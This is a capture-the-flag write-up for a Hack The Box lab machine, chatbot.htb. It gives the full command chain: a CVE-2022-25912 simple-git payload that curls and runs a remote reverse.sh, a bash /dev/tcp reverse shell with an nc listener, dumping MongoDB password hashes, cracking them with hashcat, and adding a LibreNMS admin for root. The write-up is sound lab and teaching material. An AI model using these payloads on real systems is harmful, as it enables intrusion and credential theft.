User FLAG
-----

```js
// A function that handles the submit request of the user
const handleRequest = async () => {
   // console.log(IP_ADDRESS_PORT + "Asd")
    const email = await document.getElementById('email').value
    const password = await document.getElementById('password').value
//    console.log(email)
//    console.log(password)
    axios.post(`/user/api/login`, {
        "email": email,
        "password": password
    }).then((response) => {
        try {
//            console.log(response.data)
            // here we are gonna show the error
            document.getElementById('error').innerHTML = response.data.Message
            if (response.data.Status == "success") {
                //redirect to the home page
                localStorage.setItem("logged_in", "true");
                window.location.href = `/restricted/home.html`;
            } else if (response.data.Status == "admin") {
                localStorage.setItem("logged_in", "admin");
                window.location.href = `/admin/admin.html`;
            }
        } catch (err) {
            alert("Something went Wrong")
        }
        // do whatever you want if console is [object object] then stringify the response
    })
}
```

You can create an account and login to the website. Here you obtain a JWT with this structure:

```json
{
  "userID": "65f0fe2f7359f1cd4f753fb3",
  "iat": 1710292534
}
```

Even if the local storage is doing something like this:

```js
if (response.data.Status == "success") {
    //redirect to the home page
    localStorage.setItem("logged_in", "true");
    window.location.href = `/restricted/home.html`;
} else if (response.data.Status == "admin") {
    localStorage.setItem("logged_in", "admin");
    window.location.href = `/admin/admin.html`;
}
```

You can't just modify that and try to enter with the admin account, it seems that the JWT is the one that is doing the job.

If you try you i'll get an error like this:

```json
{
  "Status": "error",
}
```

Find `simple-git` subdomain `http://dev-git-auto-update.chatbot.htb` and found that it is vulnerable to `CVE-2022-25912`

Which will give us a reverse shell.

In your machine create a `reverse.sh`

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

Start listening

```bash
nc -lvnp <PORT>
```

```bash
sudo python3 -m http.server 80
```

In the web browser

```bash
ext::sh -c curl% <YOUR_IP>/reverse.sh|bash
```

Once inside the machine, we are going to stabilize the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

After running linpeas we found a `mongodb` running on the machine. So we are going to connect to it.

```bash
mongo shell
```

Once inside the mongo shell we are going to list the databases

```bash
show dbs
use trainings # This one has a collection called users
show collections
db.users.find().pretty() # This will show the users and their passwords
```

With the password of `frank_dorky` we can login to the machine.

```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -w 3 -O -d 1
```

```bash
ssh frank_dorky@10.10.11.6
cat /home/frank_dorky/user.txt
```

Root FLAG
-----

```bash
netstat -tulnp
ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6 # LibreNMS is running on port 3000
```

We can create our own admin user with the following command

```bash
cd /opt/librenms
## Usage: ./adduser.php <username> <password> <level> <email>
## Where level 10 is admin and email is optional
./adduser.php test test 10
```
## General

### Version

Alpinejs 3.9.6
Handlebards 4.7.7
Hoganjs
OpenSSH 8.9p1
Nginx 1.18.0
Nodejs
Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Etag

### Links

- https://jwt.io/
- https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221
- https://github.com/payloadbox/xss-payload-list
- https://community.librenms.org/t/adding-admin-users-on-librenms/20782
- http://dev-git-auto-update.chatbot.htb/
- https://www.exploit-db.com/exploits/46544